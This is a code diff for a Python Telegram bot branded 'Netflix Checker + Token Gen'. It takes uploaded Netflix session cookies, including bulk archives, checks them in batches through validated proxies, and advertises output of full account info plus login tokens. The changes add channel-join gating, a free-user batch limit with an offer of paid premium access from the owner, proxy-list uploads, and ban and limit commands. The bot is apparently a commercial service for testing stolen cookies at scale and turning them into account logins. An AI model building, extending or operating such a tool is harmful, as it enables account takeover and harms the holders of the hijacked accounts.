+        f"{CE['folder']} <b>Total Batches:</b> {stats['batch_processes']}\n"
+        f"\U0001f6d1 <b>Stopped:</b> {stats['batch_stopped']}\n"
+        f"\u274c <b>Cancelled:</b> {stats['batch_cancelled']}\n"
+        f"{CE['bolt']} <b>Workers:</b> {WORKER_COUNT}/{MAX_WORKERS}\n"
+        f"\u23f0 <b>Last Gen:</b> {last_gen_str}\n\n"
+        f"{CE['movie']} <b>v5.0</b> \u2014 Netflix Checker + Token Gen"
     )
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
@@ -1873,11 +2534,21 @@ def _has_active_batch(user_id):
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    chat_id = update.message.chat_id
+    stopped_something = False
+
+    if chat_id in proxy_validation_stop:
+        proxy_validation_stop[chat_id] = True
+        await update.message.reply_text("\u26d4 Force stopping proxy validation... Live proxies found so far will be saved.", parse_mode=ParseMode.HTML)
+        stopped_something = True
+
     if user_id in stop_flags or _has_active_batch(user_id):
         stop_flags[user_id] = {"action": "stop", "save": True}
         await update.message.reply_text("\U0001f6d1 Stop signal sent. Batch will stop after current cookies...", parse_mode=ParseMode.HTML)
-    else:
-        await update.message.reply_text("\u274c No active batch process found.", parse_mode=ParseMode.HTML)
+        stopped_something = True
+
+    if not stopped_something:
+        await update.message.reply_text("\u274c No active batch or proxy validation found.", parse_mode=ParseMode.HTML)
 
 
 async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1944,6 +2615,9 @@ async def preview_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message
+    if not await check_channel_member(context.bot, message.from_user.id):
+        await message.reply_text(get_not_joined_text(), parse_mode=ParseMode.HTML, reply_markup=get_join_channel_markup())
+        return
     if not check_lock(message.from_user.id):
         await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
         return
@@ -2018,6 +2692,9 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message
+    if not await check_channel_member(context.bot, message.from_user.id):
+        await message.reply_text(get_not_joined_text(), parse_mode=ParseMode.HTML, reply_markup=get_join_channel_markup())
+        return
     if not check_lock(message.from_user.id):
         await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
         return
@@ -2079,6 +2756,9 @@ async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def extract_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message
+    if not await check_channel_member(context.bot, message.from_user.id):
+        await message.reply_text(get_not_joined_text(), parse_mode=ParseMode.HTML, reply_markup=get_join_channel_markup())
+        return
     if not check_lock(message.from_user.id):
         await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
         return
@@ -2144,6 +2824,9 @@ async def extract_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def batch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message
     user_id = message.from_user.id
+    if not await check_channel_member(context.bot, user_id):
+        await message.reply_text(get_not_joined_text(), parse_mode=ParseMode.HTML, reply_markup=get_join_channel_markup())
+        return
     if not check_lock(user_id):
         await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
         return
@@ -2204,6 +2887,19 @@ async def batch_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def process_batch_check_async(bot, message, cookies, source_name, file_size=0):
     user_id = message.from_user.id
+    if not is_authorized(user_id) and len(cookies) > FREE_COOKIE_LIMIT:
+        original_count = len(cookies)
+        cookies = cookies[:FREE_COOKIE_LIMIT]
+        try:
+            await message.reply_text(
+                f"\u26a0\ufe0f <b>Free User Limit</b>\n\n"
+                f"Found {original_count} cookies but free users can only check {FREE_COOKIE_LIMIT} per batch.\n"
+                f"Processing first {FREE_COOKIE_LIMIT} cookies only.\n\n"
+                f"{CE['key']} Get premium access from @XD_HR for unlimited checks.",
+                parse_mode=ParseMode.HTML
+            )
+        except:
+            pass
     total = len(cookies)
     stop_flags[user_id] = {"action": None, "save": True}
     task_id = f"{user_id}_{int(datetime.now().timestamp())}"
@@ -2360,6 +3056,9 @@ async def process_batch_check_async(bot, message, cookies, source_name, file_siz
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message
     user_id = message.from_user.id
+    if not await check_channel_member(context.bot, user_id):
+        await message.reply_text(get_not_joined_text(), parse_mode=ParseMode.HTML, reply_markup=get_join_channel_markup())
+        return
     if not check_lock(user_id):
         await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
         return
@@ -2376,6 +3075,29 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = message.document
     fname = doc.file_name or "cookies.txt"
     fname_lower = fname.lower()
+
+    if fname_lower.endswith('.txt') and str(user_id) == OWNER_USER_ID:
+        caption = (message.caption or "").strip().lower()
+        is_proxy_file = caption in ("proxy", "/addproxy", "addproxy", "proxies")
+        if not is_proxy_file:
+            name_check = fname_lower.replace('.txt', '').replace(' ', '').replace('_', '').replace('-', '')
+            if name_check in ("proxy", "proxies", "proxylist", "addproxy"):
+                is_proxy_file = True
+        if is_proxy_file:
+            try:
+                tg_file = await context.bot.get_file(doc.file_id)
+                local_path = await download_file_to_disk(tg_file, fname)
+                with open(local_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+                cleanup_file(local_path)
+                lines = [l.strip() for l in content.splitlines() if l.strip()]
+                if lines:
+                    await _validate_and_add_proxies(context.bot, message, lines)
+                else:
+                    await message.reply_text("\u274c Proxy file is empty.", parse_mode=ParseMode.HTML)
+            except Exception as e:
+                await message.reply_text(f"\u274c Failed to process proxy file: {e}", parse_mode=ParseMode.HTML)
+            return
 
     if fname_lower.endswith('.zip') or fname_lower.endswith('.rar') or fname_lower.endswith('.7z'):
         try:
@@ -2475,6 +3197,20 @@ async def process_zip_file_async(bot, message, zip_bytes, zip_name):
     if not all_cookies:
         await message.reply_text("\u274c No Netflix cookies found in any .txt file inside the archive.", parse_mode=ParseMode.HTML)
         return
+
+    if not is_authorized(user_id) and len(all_cookies) > FREE_COOKIE_LIMIT:
+        original_count = len(all_cookies)
+        all_cookies = all_cookies[:FREE_COOKIE_LIMIT]
+        try:
+            await message.reply_text(
+                f"\u26a0\ufe0f <b>Free User Limit</b>\n\n"
+                f"Found {original_count} cookies but free users can only check {FREE_COOKIE_LIMIT} per batch.\n"
+                f"Processing first {FREE_COOKIE_LIMIT} cookies only.\n\n"
+                f"{CE['key']} Get premium access from @XD_HR for unlimited checks.",
+                parse_mode=ParseMode.HTML
+            )
+        except:
+            pass
 
     total = len(all_cookies)
     total_files = len(file_cookie_map)
@@ -2705,6 +3441,9 @@ async def process_zip_file_async(bot, message, zip_bytes, zip_name):
 
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not await check_channel_member(context.bot, update.effective_user.id):
+        await update.message.reply_text(get_not_joined_text(), parse_mode=ParseMode.HTML, reply_markup=get_join_channel_markup())
+        return
     text = update.message.text
     if not text:
         return
@@ -2730,6 +3469,19 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     call = update.callback_query
     data = call.data
     try:
+        if data == "check_joined":
+            user = update.effective_user
+            if await check_channel_member(context.bot, user.id):
+                await call.answer(f"\u2705 Verified! You can now use the bot.", show_alert=True)
+                await call.message.delete()
+            else:
+                await call.answer(f"\u274c You haven't joined the channel yet!", show_alert=True)
+            return
+
+        if data.startswith("menu_"):
+            await start_menu_callback(update, context)
+            return
+
         if data.startswith("get_token_"):
             token_key = data[10:]
             if token_key in user_tokens:
@@ -2773,6 +3525,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await call.answer()
             else:
                 await call.answer("\u26a0\ufe0f Token expired or not found", show_alert=True)
+        elif data == "proxy_stop":
+            chat_id = call.message.chat_id
+            if chat_id in proxy_validation_stop:
+                proxy_validation_stop[chat_id] = True
+                await call.answer("\u26d4 Stopping proxy validation... Live proxies will be saved.", show_alert=True)
+            else:
+                await call.answer("\u26a0\ufe0f No proxy validation running.", show_alert=True)
+
     except Exception as e:
         logger.error(f"Button callback error: {e}")
         await call.answer(f"\u274c Error: {str(e)[:50]}", show_alert=True)
@@ -2784,7 +3544,7 @@ def main():
     print("\U0001f451 Bot Owner: @XD_HR")
     print("=" * 70)
     print(f"\u2705 Workers: {WORKER_COUNT} (max {MAX_WORKERS})")
-    print(f"\u2705 Commands: /chk /gen /extract /batch /stop /cancel /workers /mercy /remove /genkey /redeem /stats")
+    print(f"\u2705 Commands: /chk /gen /extract /batch /stop /cancel /workers /mercy /remove /genkey /redeem /stats /ban /unban /limit")
     print(f"\u2705 Output format: Full account info + login token + cookie")
     print(f"\u2705 Owner ID: {OWNER_USER_ID}")
     print(f"\u2705 Using HTTP Bot API (no API_ID/API_HASH needed)")
@@ -2805,6 +3565,9 @@ def main():
     application.add_handler(CommandHandler("proxytest", proxytest_command))
     application.add_handler(CommandHandler("proxylist", proxylist_command))
     application.add_handler(CommandHandler("workers", workers_command))
+    application.add_handler(CommandHandler("ban", ban_command))
+    application.add_handler(CommandHandler("unban", unban_command))
+    application.add_handler(CommandHandler("limit", limit_command))
     application.add_handler(CommandHandler("stats", stats_command))
     application.add_handler(CommandHandler("stop", stop_command))
     application.add_handler(CommandHandler("cancel", cancel_command))
